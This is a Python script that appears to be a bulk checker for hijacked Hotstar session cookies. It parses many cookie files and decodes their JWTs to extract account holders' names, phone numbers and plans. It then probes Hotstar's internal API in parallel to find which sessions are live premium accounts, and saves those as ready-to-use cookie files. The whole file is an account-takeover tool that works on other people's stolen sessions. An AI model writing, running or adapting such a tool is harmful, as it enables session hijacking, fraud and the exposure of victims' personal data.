import requests
import json
import os
import base64
import glob
import re
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

def decode_jwt(token):
    try:
        parts = token.split('.')
        if len(parts) >= 2:
            payload = parts[1]
            payload += '=' * (4 - len(payload) % 4)
            decoded = base64.b64decode(payload)
            return json.loads(decoded)
    except:
        pass
    return None

def parse_cookie_file(filepath):
    cookies = {}
    session_token = None
    user_up_token = None
    device_id = None
    
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            parts = line.split('\t')
            if len(parts) >= 7:
                name = parts[5]
                value = parts[6]
                cookies[name] = value
                if name == 'sessionUserUP':
                    session_token = value
                elif name == 'userUP':
                    user_up_token = value
                elif name == 'deviceId':
                    device_id = value
    
    cookie_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])
    return cookie_str, session_token, user_up_token, device_id, cookies

def convert_to_netscape(cookies_dict):
    lines = ["# Netscape HTTP Cookie File"]
    
    for name, value in cookies_dict.items():
        domain = ".hotstar.com"
        flag = "TRUE"
        path = "/"
        secure = "FALSE"
        expiry = "1779686026"
        
        lines.append(f"{domain}\t{flag}\t{path}\t{secure}\t{expiry}\t{name}\t{value}")
    
    return "\n".join(lines)

def extract_essential_cookies(cookies_dict):
    essential = {}
    
    critical_keys = ['sessionUserUP', 'userUP', 'deviceId', 'userCountryCode', 'userHID', 'userPID']
    
    for key in critical_keys:
        if key in cookies_dict:
            essential[key] = cookies_dict[key]
    
    return essential

def clean_filename(name):
    return name.replace(' ', '_').replace('/', '_').replace('\\', '_')

def check_cookie(filepath):
    cookie_str, session_token, user_up_token, device_id, all_cookies = parse_cookie_file(filepath)
    token_to_use = session_token or user_up_token
    
    if not cookie_str:
        return "INVALID", None
    
    name = "Unknown"
    phone = "Unknown"
    jwt_plan = "Unknown"
    jwt_expiry = "Unknown"
    
    if token_to_use:
        jwt_data = decode_jwt(token_to_use)
        if jwt_data and 'sub' in jwt_data:
            try:
                sub_data = json.loads(jwt_data['sub'])
                name = sub_data.get('name', 'Unknown')
                phone = sub_data.get('phone', 'Unknown')
                if 'subscriptions' in sub_data:
                    for country, plans in sub_data['subscriptions'].items():
                        for plan, details in plans.items():
                            jwt_plan = plan
                            jwt_expiry = details.get('expiry', 'Unknown')[:10] if details.get('expiry') else 'Unknown'
            except:
                pass
    
    headers = {
        "accept": "application/json, text/plain, */*",
        "x-hs-platform": "web",
        "x-hs-app": "260306000",
        "cookie": cookie_str,
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "x-country-code": "in",
        "referer": "https://www.hotstar.com/in/home"
    }
    
    if token_to_use:
        headers["x-hs-usertoken"] = token_to_use
    if device_id:
        headers["x-hs-device-id"] = device_id
    
    try:
        r = requests.get(
            "https://www.hotstar.com/api/internal/bff/v2/slugs/in/settings",
            headers=headers,
            timeout=15
        )
        
        if r.status_code == 200:
            text = r.text
            
            if 'ERR_UM_USER_LOGGED_OUT' in text:
                return "DEVICE_LIMIT", {
                    'name': name,
                    'phone': phone,
                    'plan': jwt_plan,
                    'expiry': jwt_expiry,
                    'essential_cookies': extract_essential_cookies(all_cookies)
                }
            
            if 'Plan expires in' in text or 'Plan expires on' in text:
                days_match = re.search(r'Plan expires in (\d+) days', text)
                if not days_match:
                    days_match = re.search(r'expires in (\d+) days', text)
                
                days_left = days_match.group(1) if days_match else "?"
                
                plan = jwt_plan
                if 'JioFiber Plan' in text:
                    plan = "JioFiber Plan"
                elif 'JHSMobileLite' in text:
                    plan = "JHSMobileLite"
                elif 'HotstarSuper' in text:
                    plan = "HotstarSuper"
                elif 'HotstarBundle' in text:
                    plan = "HotstarBundle"
                elif 'SingleDevice' in text:
                    plan = "SingleDevice"
                
                show_ads = "Yes"
                if '"showAds":"0"' in text:
                    show_ads = "No"
                
                return "LIVE", {
                    'name': name,
                    'phone': phone,
                    'plan': plan,
                    'expiry': jwt_expiry,
                    'days_left': days_left,
                    'show_ads': show_ads,
                    'essential_cookies': extract_essential_cookies(all_cookies)
                }
            else:
                return "FREE", {
                    'name': name,
                    'phone': phone,
                    'plan': jwt_plan,
                    'expiry': jwt_expiry
                }
        else:
            return "INVALID", {'reason': f'HTTP {r.status_code}'}
            
    except Exception as e:
        return "INVALID", {'reason': str(e)[:50]}

def save_live_cookie(info, folder):
    clean_name = clean_filename(info['name'])
    clean_plan = clean_filename(info['plan'])
    filename = f"{clean_name}_{clean_plan}.txt"
    filepath = os.path.join(folder, filename)
    
    with open(filepath, "w", encoding='utf-8') as f:
        f.write(f"# LIVE - WORKING PREMIUM COOKIE\n")
        f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Name: {info['name']}\n")
        f.write(f"# Phone: {info['phone']}\n")
        f.write(f"# Plan: {info['plan']}\n")
        f.write(f"# Expires: {info['expiry']} ({info['days_left']} days left)\n")
        f.write(f"# Ads: {info['show_ads']}\n\n")
        
        netscape = convert_to_netscape(info['essential_cookies'])
        f.write(netscape)
    
    return filename

def save_device_limit_cookie(info, folder):
    clean_name = clean_filename(info['name'])
    clean_plan = clean_filename(info['plan'])
    filename = f"{clean_name}_{clean_plan}.txt"
    filepath = os.path.join(folder, filename)
    
    with open(filepath, "w", encoding='utf-8') as f:
        f.write(f"# DEVICE LIMIT - SESSION EXPIRED\n")
        f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Name: {info['name']}\n")
        f.write(f"# Phone: {info['phone']}\n")
        f.write(f"# Plan: {info['plan']}\n")
        f.write(f"# Subscription Expires: {info['expiry']}\n")
        f.write(f"# Status: Session expired, need to logout other devices\n\n")
        
        netscape = convert_to_netscape(info['essential_cookies'])
        f.write(netscape)
    
    return filename

def main():
    live_folder = "live_cookies"
    device_limit_folder = "device_limit_cookies"
    os.makedirs(live_folder, exist_ok=True)
    os.makedirs(device_limit_folder, exist_ok=True)
    
    cookie_files = glob.glob("cookies/*.txt")
    
    if not cookie_files:
        print("No cookie files found in 'cookies' folder")
        return
    
    print(f"\nFound {len(cookie_files)} cookie files\n")
    
    live = []
    device_limit = []
    free_accounts = []
    invalid = []
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check_cookie, f): f for f in cookie_files}
        
        for future in as_completed(futures):
            filepath = futures[future]
            filename = os.path.basename(filepath)
            
            try:
                status, info = future.result()
                
                if status == "LIVE":
                    saved_file = save_live_cookie(info, live_folder)
                    live.append({'file': saved_file, 'info': info})
                    print(f"✅ STATUS: LIVE")
                    print(f"   Name: {info['name']}")
                    print(f"   Plan: {info['plan']}")
                    print(f"   Expires: {info['days_left']} days left")
                    print(f"   Ads: {info['show_ads']}")
                    print(f"   Saved: {live_folder}/{saved_file}\n")
                    
                elif status == "DEVICE_LIMIT":
                    saved_file = save_device_limit_cookie(info, device_limit_folder)
                    device_limit.append({'file': saved_file, 'info': info})
                    print(f"⚠️ STATUS: DEVICE LIMIT")
                    print(f"   Name: {info['name']}")
                    print(f"   Plan: {info['plan']}")
                    print(f"   Expires: {info['expiry']}")
                    print(f"   Saved: {device_limit_folder}/{saved_file}\n")
                    
                elif status == "FREE":
                    free_accounts.append({'file': filename, 'info': info})
                    print(f"○ STATUS: FREE")
                    print(f"   Name: {info['name']}")
                    print(f"   Plan: {info['plan']}\n")
                    
                else:
                    invalid.append({'file': filename, 'info': info})
                    
            except Exception as e:
                print(f"❌ ERROR: {filename}\n")
   
    print("📊 SUMMARY")
    print(f"✅ LIVE: {len(live)}")
    print(f"⚠️ DEVICE LIMIT: {len(device_limit)}")
    print(f"○ FREE: {len(free_accounts)}")
    print(f"❌ INVALID: {len(invalid)}\n")
    
    if live:
        print(f"💾 Saved {len(live)} LIVE cookies to '{live_folder}' folder")
    if device_limit:
        print(f"💾 Saved {len(device_limit)} Device Limit cookies to '{device_limit_folder}' folder")

if __name__ == "__main__":
    main()
